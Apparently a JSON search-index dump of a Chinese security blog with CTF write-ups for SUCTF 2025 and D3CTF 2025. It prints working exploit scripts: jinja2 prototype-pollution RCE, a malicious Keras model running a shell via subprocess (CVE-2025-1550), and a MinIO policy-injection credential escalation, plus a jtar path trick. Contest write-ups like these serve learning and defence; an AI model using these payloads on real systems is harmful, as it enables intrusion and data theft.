\u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" Z3n1th z3âœŒï¸ N1rvana SU Weber Kengwang Stay Cool~ J1rry SYCã®Weber adwa 0XFFF-Cryptor ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSycloveræ ¸å¿ƒæˆå‘˜,ä¸»åŠ›æˆå‘˜\u0026amp;Nu1Læˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€å¶ç„¶ä¹Ÿä¼šå­¦ç‚¹äº‘å®‰å…¨,ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":["Javaå®‰å…¨","WP"],"contents":"å‰è¨€ è·Ÿç€Sycæ‰“çš„ï¼Œwebæ–¹å‘å·®ä¸€é¢˜akï¼Œç®—æ˜¯æœ‰ç‚¹å¯æƒœäº†\nd3model é¢˜ç›®å†…å°±ä¸€ä¸ªapp.py\nimport keras\rfrom flask import Flask, request, jsonify\rimport os\rdef is_valid_model(modelname):\rtry:\rkeras.models.load_model(modelname)\rexcept Exception as e:\rprint(e)\rreturn False\rreturn True\rapp = Flask(__name__)\r@app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;])\rdef index():\rreturn open(\u0026#39;index.html\u0026#39;).read()\r@app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;])\rdef upload_file():\rif \u0026#39;file\u0026#39; not in request.files:\rreturn jsonify({\u0026#39;error\u0026#39;: \u0026#39;No file part\u0026#39;}), 400\rfile = request.files[\u0026#39;file\u0026#39;]\rif file.filename == \u0026#39;\u0026#39;:\rreturn jsonify({\u0026#39;error\u0026#39;: \u0026#39;No selected file\u0026#39;}), 400\rMAX_FILE_SIZE = 50 * 1024 * 1024 # 50MB\rfile.seek(0, os.SEEK_END)\rfile_size = file.tell()\rfile.seek(0)\rif file_size \u0026gt; MAX_FILE_SIZE:\rreturn jsonify({\u0026#39;error\u0026#39;: \u0026#39;File size exceeds 50MB limit\u0026#39;}), 400\rfilepath = os.path.join(\u0026#39;./\u0026#39;, \u0026#39;test.keras\u0026#39;)\rif os.path.exists(filepath):\ros.remove(filepath)\rfile.save(filepath)\rif is_valid_model(filepath):\rreturn jsonify({\u0026#39;message\u0026#39;: \u0026#39;Model is valid\u0026#39;}), 200\relse:\rreturn jsonify({\u0026#39;error\u0026#39;: \u0026#39;Invalid model file\u0026#39;}), 400\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5001) ä»£ç ä¹Ÿæ²¡å•¥å¥½å®¡çš„ï¼Œå¾ˆæ˜æ˜¾å°±åªæœ‰ä¸€ä¸ªkeras.models.load_model(modelname)èƒ½å½“ä½œsinkç‚¹ï¼Œå»ç½‘ä¸Šæœä¸€ä¸‹ç›¸å…³æ¼æ´å°±èƒ½æ‰¾åˆ°ç°æˆçš„payloadï¼Œé¢˜ç›®ä¸å‡ºç½‘ï¼Œå¤–å¸¦åˆ°index.htmlå³å¯\nhttps://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models\nexp\nimport os\rimport zipfile\rimport json\rfrom keras.models import Sequential\rfrom keras.layers import Dense\rimport numpy as np\rmodel_name = \u0026#34;test.keras\u0026#34;\rx_train = np.random.rand(100, 28 * 28)\ry_train = np.random.rand(100)\rmodel = Sequential([Dense(1, activation=\u0026#39;linear\u0026#39;, input_dim=28 * 28)])\rmodel.compile(optimizer=\u0026#39;adam\u0026#39;, loss=\u0026#39;mse\u0026#39;)\rmodel.fit(x_train, y_train, epochs=5)\rmodel.save(model_name)\rwith zipfile.ZipFile(model_name, \u0026#34;r\u0026#34;) as f:\rconfig = json.loads(f.read(\u0026#34;config.json\u0026#34;).decode())\rconfig[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;module\u0026#34;] = \u0026#34;keras.models\u0026#34;\rconfig[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;class_name\u0026#34;] = \u0026#34;Model\u0026#34;\rconfig[\u0026#34;config\u0026#34;][\u0026#34;layers\u0026#34;][0][\u0026#34;config\u0026#34;] = {\r\u0026#34;name\u0026#34;: \u0026#34;mvlttt\u0026#34;,\r\u0026#34;layers\u0026#34;: [\r{\r\u0026#34;name\u0026#34;: \u0026#34;mvlttt\u0026#34;,\r\u0026#34;class_name\u0026#34;: \u0026#34;function\u0026#34;,\r\u0026#34;config\u0026#34;: \u0026#34;Popen\u0026#34;,\r\u0026#34;module\u0026#34;: \u0026#34;subprocess\u0026#34;,\r\u0026#34;inbound_nodes\u0026#34;: [{\u0026#34;args\u0026#34;: [[\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;env\u0026gt;\u0026gt;index.html\u0026#34;]], \u0026#34;kwargs\u0026#34;: {\u0026#34;bufsize\u0026#34;: -1}}]\r}],\r\u0026#34;input_layers\u0026#34;: [[\u0026#34;mvlttt\u0026#34;, 0, 0]],\r\u0026#34;output_layers\u0026#34;: [[\u0026#34;mvlttt\u0026#34;, 0, 0]]\r}\rwith zipfile.ZipFile(model_name, \u0026#39;r\u0026#39;) as zip_read:\rwith zipfile.ZipFile(f\u0026#34;tmp.{model_name}\u0026#34;, \u0026#39;w\u0026#39;) as zip_write:\rfor item in zip_read.infolist():\rif item.filename != \u0026#34;config.json\u0026#34;:\rzip_write.writestr(item, zip_read.read(item.filename))\ros.remove(model_name)\ros.rename(f\u0026#34;tmp.{model_name}\u0026#34;, model_name)\rwith zipfile.ZipFile(model_name, \u0026#34;a\u0026#34;) as zf:\rzf.writestr(\u0026#34;config.json\u0026#34;, json.dumps(config))\rprint(\u0026#34;[+] Malicious model ready\u0026#34;) d3jtar ç»™äº†ä¸ªwaråŒ…ï¼Œç›´æ¥æ”¾åœ¨tomcatéƒ¨ç½²å°±å¥½\né¢˜ç›®åªæœ‰ä¸€ä¸ªControllerï¼Œé€»è¾‘å¦‚ä¸‹\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package d3.example.controller; import d3.example.utils.BackUp; import d3.example.utils.Upload; import java.io.File; import java.io.IOException; import java.nio.file.Paths; import java.util.Arrays; import java.util.HashSet; import java.util.Objects; import java.util.Set; import javax.servlet.http.HttpServletRequest; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.servlet.ModelAndView; @Controller public class MainController { public MainController() { } @GetMapping({\u0026#34;/view\u0026#34;}) public ModelAndView view(@RequestParam String page, HttpServletRequest request) { if (page.matches(\u0026#34;^[a-zA-Z0-9-]+$\u0026#34;)) { String viewPath = \u0026#34;/WEB-INF/views/\u0026#34; + page + \u0026#34;.jsp\u0026#34;; String realPath = request.getServletContext().getRealPath(viewPath); File jspFile = new File(realPath); if (realPath != null \u0026amp;\u0026amp; jspFile.exists()) { return new ModelAndView(page); } } ModelAndView mav = new ModelAndView(\u0026#34;Error\u0026#34;); mav.addObject(\u0026#34;message\u0026#34;, \u0026#34;The file don\u0026#39;t exist.\u0026#34;); return mav; } @PostMapping({\u0026#34;/Upload\u0026#34;}) @ResponseBody public String UploadController(@RequestParam MultipartFile file) { try { String uploadDir = \u0026#34;webapps/ROOT/WEB-INF/views\u0026#34;; Set\u0026lt;String\u0026gt; blackList = new HashSet(Arrays.asList(\u0026#34;jsp\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;jhtml\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;xml\u0026#34;, \u0026#34;war\u0026#34;, \u0026#34;jar\u0026#34;)); String filePath = Upload.secureUpload(file, uploadDir, blackList); return \u0026#34;Upload Success: \u0026#34; + filePath; } catch (Upload.UploadException e) { return \u0026#34;The file is forbidden: \u0026#34; + e; } } @PostMapping({\u0026#34;/BackUp\u0026#34;}) @ResponseBody public String BackUpController(@RequestParam String op) { if (Objects.equals(op, \u0026#34;tar\u0026#34;)) { try { BackUp.tarDirectory(Paths.get(\u0026#34;backup.tar\u0026#34;), Paths.get(\u0026#34;webapps/ROOT/WEB-INF/views\u0026#34;)); return \u0026#34;Success !\u0026#34;; } catch (IOException var3) { return \u0026#34;Failure : tar Error\u0026#34;; } } else if (Objects.equals(op, \u0026#34;untar\u0026#34;)) { try { BackUp.untar(Paths.get(\u0026#34;webapps/ROOT/WEB-INF/views\u0026#34;), Paths.get(\u0026#34;backup.tar\u0026#34;)); return \u0026#34;Success !\u0026#34;; } catch (IOException var4) { return \u0026#34;Failure : untar Error\u0026#34;; } } else { return \u0026#34;Failure : option Error\u0026#34;; } } } Viewæ¥å£åªèƒ½å¤Ÿæ¸²æŸ“jspåç¼€çš„æ–‡ä»¶\nUploadæ¥å£èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œä¸è¿‡æœ‰äº›filter\nBackUPèƒ½å¤Ÿä½¿ç”¨jtarè¿™ä¸ªç»„ä»¶å¯¹webapps/ROOT/WEB-INF/viewsç›®å½•ä¸‹çš„æ–‡ä»¶æ‰“åŒ…æˆtaræˆ–è€…è§£åŒ…\nè¿™é‡Œæœ‰ä¸ªå¾ˆè¯¯å¯¼çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯ç›´æ¥å¯¼è‡´æˆ‘èµ›ä¸­æ²¡åšå‡ºæ¥çš„åŸå› ï¼Œå°±æ˜¯viewæ¥å£ä¸­çš„\u0026quot;/WEB-INF/views/\u0026quot; + page + \u0026ldquo;.jsp\u0026rdquo;;å’ŒBackUpæ¥å£ä¸­çš„webapps/ROOT/WEB-INF/viewsæŒ‡çš„æ˜¯åŒä¸€ä¸ªç›®å½•ï¼Œåœ¨æ¯”èµ›æœŸé—´ç”±äºæˆ‘åœ¨Tomcatéƒ¨ç½²ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹å›¾ï¼Œæ‰€ä»¥æˆ‘çš„æƒ³æ³•ä¸€ç›´éƒ½æ˜¯åˆ©ç”¨æŸç§æ–¹æ³•æ¥è¿›è¡Œç›®å½•ç©¿è¶Šæ“ä½œï¼Œæœ€åå¤ç°è¯•äº†ä¸€ä¸‹è¿œç¨‹ï¼Œå‘ç°ä¸¤ä¸ªæ˜¯åŒä¸€ä¸ªç›®å½•ï¼Œç»·ä¸ä½äº† uploadè¿‡æ»¤åšçš„å¾ˆä¸¥ï¼ŒåŸºæœ¬ä¸å¯èƒ½æˆåŠŸä¸Šä¼ ,åŠ ä¸Šé¢˜ç›®æé†’jtarï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯jtarè¿™ä¸ªç»„ä»¶æœ‰é—®é¢˜\njtaråœ¨æ‰“åŒ…çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼Œæ¯ä¸ªè¦è¢«æ‰“åŒ…çš„æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªEntryçš„å®ä¾‹ï¼Œè¿™ä¸ªEntryåŒ…å«äº†è¿™ä¸ªæ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚å¤§å°ï¼Œåå­—ï¼Œæƒé™ï¼Œè¿˜æœ‰ç”¨æˆ·çš„åå­—ç­‰ç­‰\nç„¶ååœ¨TarOutputStreamä¸­åˆ©ç”¨putNextEntryå°†æ¯ä¸ªå®ä¾‹åŒ–å¥½çš„Entryå¯¹è±¡æ”¾è¿›Streamä¸­ï¼Œæœ€åwriteè¿›æ–‡ä»¶ä¸­\nè¿™é‡Œå­˜åœ¨æ¼æ´çš„åœ°æ–¹å°±åœ¨putNextEntryä¸­\nè¿›å…¥writeEntryHeader\nè¿™é‡Œè·å–æ–‡ä»¶åçš„Bytes\nå°†æ–‡ä»¶åçš„charå¼ºåˆ¶è½¬æ¢ä¸ºbyteå¹¶ä¸”æ”¾åˆ°bufferé‡Œï¼Œè¿™é‡Œä¼šå¯¼è‡´ä¸€ç§ä»€ä¹ˆæƒ…å†µå‘¢\njavaä¸­charçš„å¤§å°åœ¨\\u0000-\\uffffä¹‹é—´ï¼Œè€Œbyteçš„å¤§å°åœ¨(-127)-128ä¹‹é—´ï¼Œæ‰€ä»¥å½“charçš„å€¼åœ¨257æ—¶ï¼Œè¢«å¼ºåˆ¶è½¬æ¢æˆbyteï¼Œåˆ™ä¼šå˜æˆ1ï¼Œå³asciiç ä¸º1å¯¹åº”çš„å­—ç¬¦\næ‰€ä»¥è¿™é‡Œçš„æ€è·¯ä¹Ÿå‡ºæ¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°è¶…å‡ºbyteå¤§å°é™åˆ¶çš„ä¸€ä¸ªunicodeç å°±è¡Œäº†\nç„¶åè¿›è¡Œä¸€è½®tarå’Œuntarï¼Œæœ€åå¾—åˆ°ä¸‹é¢è¿™ä¸ªç»“æœ\næ‰€ä»¥è§£å‡ºæ€è·¯å¤§è‡´å°±æ˜¯è¿™æ ·ï¼Œé™„ä¸€å¼ è§£å‡ºå›¾\nd3invitation ç¯å¢ƒæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªossç«¯ï¼Œä¸€ä¸ªwebç«¯\nWebç«¯è¿™è¾¹æµ‹ç«¯å£ä¸€å…±æµ‹å‡ºæ¥ä¸‰ä¸ª\n/api/genSTSCreds\tç”ŸæˆAK,SKè¿˜æœ‰session_token /api/putObject æ‹¿ç€ä¸Šé¢ç”Ÿæˆçš„å‡­è¯å¾€å‚¨å­˜æ¡¶é‡Œæ”¾object /api/putObject è¯»å–æ¡¶ä¸‹çš„object /invitation æ²¡å•¥åŠç”¨ï¼Œç”Ÿæˆé‚€è¯·å‡½çš„é¡µé¢ è¿™é‡Œtokenæˆ‘ä»¬å¯ä»¥è§£ä¸€ä¸‹é‡Œé¢çš„å†…å®¹\njwt.io\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå«sessionPolicyçš„ä¸œè¥¿\nå®šä¹‰äº†æˆ‘ä»¬çš„ä¸€äº›policyï¼Œä»¥åŠå¯è¯»çš„æƒé™åªæœ‰æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶\né‚£è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œflagå°±åœ¨æ¡¶ä¹‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è·å–åˆ°ä¸€å®šçš„æƒé™å»è¯»è¿™ä¸ªflag\né‚£æˆ‘ä»¬è¿™é‡Œéœ€è¦è·å¾—ä¸€ä¸ªå¤Ÿæƒé™çš„tokenï¼Œè¦ä¹ˆæ˜¯è·å¾—ä»–tokençš„keyå€¼ï¼Œè¦ä¹ˆå°±æ˜¯è®©ä»–ç”Ÿæˆä¸€ä¸ªå¤Ÿæƒé™çš„token\nä¸Šé¢æˆ‘ä»¬çœ‹åˆ°policyæ˜¯ä¸€ä¸ªjson,è¿™é‡Œå¯ä»¥å°è¯•ä½¿ç”¨\u0026quot;æ¥é—­åˆæ³¨å…¥\nfailedäº†ï¼Œè¯´æ˜é—­åˆä¸Šäº†ï¼Œè¿™é‡Œæ˜¯å¯ä»¥æ³¨å…¥çš„ï¼Œåç»­ä¹Ÿæ²¡å•¥ä¸œè¥¿äº†æˆ‘è§‰å¾—ï¼Œå°±æ˜¯æ³¨å…¥ä¸€ä¸ªé«˜æƒé™çš„policyï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç”©exp\nfrom minio import Minio\rfrom minio.error import S3Error\rimport requests\rimport json\rBASE_URL = \u0026#34;http://35.241.98.126:31802\u0026#34; # â† æ”¹æˆä½ çš„ç›®æ ‡åœ°å€\rUPLOAD_FILENAME = \u0026#39;\u0026#34;],\\\u0026#34;Action\\\u0026#34;:[\\\u0026#34;s3:GetObject\\\u0026#34;,\\\u0026#34;s3:PutObject\\\u0026#34;]},{\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\u0026#34;Action\u0026#34;: [\u0026#34;s3:GetObject\u0026#34;,\u0026#34;s3:PutObject\u0026#34;,\u0026#34;s3:ListBucket\u0026#34;,\u0026#34;s3:ListAllMyBuckets\u0026#34;,\u0026#34;s3:GetBucketLocation\u0026#34;],\u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;}]}aaa\u0026#39;\rUPLOAD_CONTENT = b\u0026#34;This is a test file from attacker.\u0026#34;\rACCESS_KEY = \u0026#34;\u0026#34;\rSECRET_KEY = \u0026#34;\u0026#34;\rBUCKET_NAME = \u0026#34;flag\u0026#34;\rSESSION_TOKEN=\u0026#34;\u0026#34;\r# Step 1: è·å–ä¸´æ—¶å‡­è¯\rdef get_temp_creds(object_name):\rglobal ACCESS_KEY, SECRET_KEY, SESSION_TOKEN\rurl = f\u0026#34;{BASE_URL}/api/genSTSCreds\u0026#34;\rdata = {\u0026#34;object_name\u0026#34;: object_name}\rresp = requests.post(url, json=data)\rresp.raise_for_status()\rprint(\u0026#34;[+] è·å–ä¸´æ—¶å‡­è¯æˆåŠŸ\u0026#34;)\r# temp=json.loads()\rACCESS_KEY= resp.json()[\u0026#39;access_key_id\u0026#39;]\rSECRET_KEY=resp.json()[\u0026#39;secret_access_key\u0026#39;]\rSESSION_TOKEN=resp.json()[\u0026#39;session_token\u0026#39;]\rreturn ACCESS_KEY,SECRET_KEY,SESSION_TOKEN\r# MinIO server configuration\rget_temp_creds(UPLOAD_FILENAME)\r# Initialize the MinIO client\rprint(ACCESS_KEY)\rprint(SECRET_KEY)\rprint(SESSION_TOKEN)\rminio_client = Minio(\r\u0026#34;35.241.98.126:32402\u0026#34;,\raccess_key=ACCESS_KEY,\rsecret_key=SECRET_KEY,\rsession_token=SESSION_TOKEN,\rsecure=False\r)\rdef download_file(object_name, download_path):\r\u0026#34;\u0026#34;\u0026#34;Download a file from the MinIO bucket.\u0026#34;\u0026#34;\u0026#34;\rtry:\rminio_client.fget_object(BUCKET_NAME, object_name, download_path)\rprint(f\u0026#34;[+] File \u0026#39;{object_name}\u0026#39; downloaded to \u0026#39;{download_path}\u0026#39;\u0026#34;)\rexcept S3Error as e:\rprint(f\u0026#34;[-] Error downloading file: {e}\u0026#34;)\rdef list_objects():\r\u0026#34;\u0026#34;\u0026#34;List all objects in the MinIO bucket.\u0026#34;\u0026#34;\u0026#34;\rtry:\robjects = minio_client.list_objects(BUCKET_NAME)\rprint(\u0026#34;[+] Objects in bucket:\u0026#34;)\rfor obj in objects:\rprint(f\u0026#34; - {obj.object_name}\u0026#34;)\rexcept S3Error as e:\rprint(f\u0026#34;[-] Error listing objects: {e}\u0026#34;)\rdef list_buckets():\r\u0026#34;\u0026#34;\u0026#34;List all buckets in the MinIO server.\u0026#34;\u0026#34;\u0026#34;\rtry:\rbuckets = minio_client.list_buckets()\rprint(\u0026#34;[+] Buckets:\u0026#34;)\rprint(buckets)\rfor bucket in buckets:\rprint(f\u0026#34; - {bucket.name}\u0026#34;)\rexcept S3Error as e:\rprint(f\u0026#34;[-] Error listing buckets: {e}\u0026#34;)\rlist_buckets()\rlist_objects()\rdownload_file(\u0026#34;flag\u0026#34;, \u0026#34;downloaded_example.txt\u0026#34;) tidy quic ","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/post/d3ctf2025/","section":"post","tags":null,"title":"D3CTF 2025-WP"}]